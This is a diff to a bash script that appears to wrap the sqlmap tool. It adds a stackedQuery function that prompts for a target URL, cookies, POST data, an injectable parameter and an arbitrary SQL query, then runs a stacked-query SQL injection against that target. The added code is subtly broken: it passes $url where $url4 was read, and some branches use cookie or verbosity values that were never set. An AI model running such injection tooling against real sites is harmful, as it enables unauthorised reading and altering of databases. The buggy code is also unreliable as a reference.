@@ -60,6 +60,31 @@ else
 sqlmap -v=$verbose3 --url="$url3" --method=POST -a --level=$level3 --risk=$risk3 --flush-session --technique=U
 fi
 }
+function stackedQuery() {
+read -p "Do you have cookies?(y=1/n=0): " cookiein4
+read -p "Do you want verbosed stacked query attack?(y=1/n=0): " verbosein4
+read -p "Url: " url4
+read -p "Data to be used in post req: " data4
+read -p "Testable Parameter(ex. search): " p4 
+read -p "Risk: " risk4
+read -p "Level: " level4
+read -p "DBMS: " dbms4
+read -p "Sql Query: " sqlquery4
+if [ "$cookiein4" -eq 1 ] && [ "$verbosein4" -eq 1 ]
+then
+read -p "Cookie: " cookie4
+read -p "Verbosity Level: " verbose4
+sqlmap -u "$url" --cookie="$cookie4" --data="$data4" -p="$p4" -v=$verbose4 --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+elif [ "$cookiein4" -eq 1 ]
+then
+sqlmap -u "$url" --cookie="$cookie4" --data="$data4" -p "$p4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+elif [ "$verbosein4" -eq 1 ]
+then
+sqlmap -u="$url" --data="$data4" -p="$p4" -v="$verbose4" --dbms="$dbms4" --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+else
+sqlmap -u="$url"  --data="$data4" -p="$p4"  --dbms=Mysql --risk=$risk4 --level=$level4 --sql-query="$sqlquery4"
+fi
+}
 function choices() {
 echo "
 -----------------------
@@ -118,4 +143,3 @@ sudo apt update && sudo apt install sqlmap
 fi
 }
 main
-
